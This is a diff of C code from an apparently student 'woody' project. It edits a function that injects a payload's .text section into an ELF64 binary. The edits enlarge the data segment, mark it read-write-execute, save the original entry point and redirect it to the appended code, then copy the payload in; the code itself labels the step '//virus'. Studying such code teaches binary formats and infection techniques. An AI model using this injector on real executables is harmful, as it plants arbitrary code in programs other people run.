@@ -6,7 +6,7 @@
 /*   By: tktorza <tktorza@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2017/11/15 12:02:55 by tktorza           #+#    #+#             */
-/*   Updated: 2017/11/29 17:36:28 by tktorza          ###   ########.fr       */
+/*   Updated: 2017/11/29 18:10:56 by tktorza          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -129,35 +129,38 @@ void	woody_start(void *ptr, unsigned int size, int fd)
 	int gap = 0;
 	char	prev[size];
 	Elf64_Addr e_entry; 
-
-	// ft_memcpy((void *)prev, ptr, size);
-	Elf64_Ehdr *header = (Elf64_Ehdr *)ptr;
-	Elf64_Phdr	*data_seg = elf_find_gap(ptr, &data_end/*, size, &gap*/);
-	Elf64_Addr	base = data_seg->p_vaddr;
-	//test programme header segment
-	// listing_seg(ptr);
-
-	printf("base == %p | e_entry = %llx\n", (void *)base, header->e_entry);
-    printf ("+ .text segment gap at offset 0x%x(0x%x bytes available)\n", data_end, gap);
-  
+//virus
 	struct stat buf;
 	int		fd_infect;
 	void		*inf_addr = open_decrypt(&buf, &fd_infect);
 	Elf64_Shdr *p_text_sec = elf_find_section(inf_addr, ".text");
 	Elf64_Shdr *bss_sec = elf_find_section(ptr, ".bss");
-	bss_sec->sh_addr += (p_text_sec->sh_size + 7);
-	bss_sec->sh_offset += (p_text_sec->sh_size + 7);
+	Elf64_Ehdr	*header = (Elf64_Ehdr *)ptr;
+	Elf64_Phdr	*data_seg = elf_find_gap(ptr, &data_end/*, size, &gap*/);
+	Elf64_Shdr *data_sec = elf_find_section(ptr, ".data");	
+	Elf64_Addr	base = data_seg->p_vaddr;
+	// ft_memcpy((void *)prev, ptr, size);
+	//test programme header segment
+	// listing_seg(ptr);
+	header->e_shoff += p_text_sec->sh_size/* + 7*/;
+	e_entry = header->e_entry;
+	header->e_entry = data_seg->p_vaddr + data_seg->p_filesz + (data_seg->p_memsz - data_seg->p_filesz);
+	data_seg->p_memsz += p_text_sec->sh_size;
+	data_seg->p_filesz += p_text_sec->sh_size;
+	bss_sec->sh_offset += (p_text_sec->sh_size/* + 7*/);
+	data_seg->p_flags = PF_R | PF_W | PF_X;
+	
+	printf("base == %p | e_entry = %llx\n", (void *)base, header->e_entry);
+    printf ("+ .text segment gap at offset 0x%x(0x%x bytes available)\n", data_end, gap);
+  
+	
+	// bss_sec->sh_addr += (p_text_sec->sh_size/* + 7*/);
 
 	//mettre les flags sur le segment .text
 	printf ("+ Payload .text section found at %llx (%llx bytes)\n", 
 	p_text_sec->sh_offset, p_text_sec->sh_size);
 
-	data_seg->p_flags = PF_R | PF_W | PF_X;
-	data_seg->p_memsz += p_text_sec->sh_size;
-	data_seg->p_filesz += p_text_sec->sh_size;
-	e_entry = header->e_entry;
-	header->e_entry = data_seg->p_vaddr + data_seg->p_filesz + (data_seg->p_memsz - data_seg->p_filesz);
-	header->e_shoff += p_text_sec->sh_size + 7;
+	
 	//decaller chaque offset des sections apres data de bss_size + p_text_sec->sh_size
 	// boucle_after_data_segment();
 	// write(fd, "\x48\xc7\x44\x24\x08", 5); /* movq [rsp + 8], */
@@ -173,7 +176,7 @@ void	woody_start(void *ptr, unsigned int size, int fd)
 	/* Copy payload in the segment padding area */
 	// ft_memmove (ptr + text_end, inf_addr + p_text_sec->sh_offset, p_text_sec->sh_size);
 	printf("It's ok\n");
-
+ data_end = data_sec->sh_offset + data_sec->sh_size;
 	ft_memmove (ptr + data_end/* + (data_seg->p_memsz - data_seg->p_filesz)*/,
 	inf_addr + p_text_sec->sh_offset, p_text_sec->sh_size);
 	printf("It's ok 2\n");
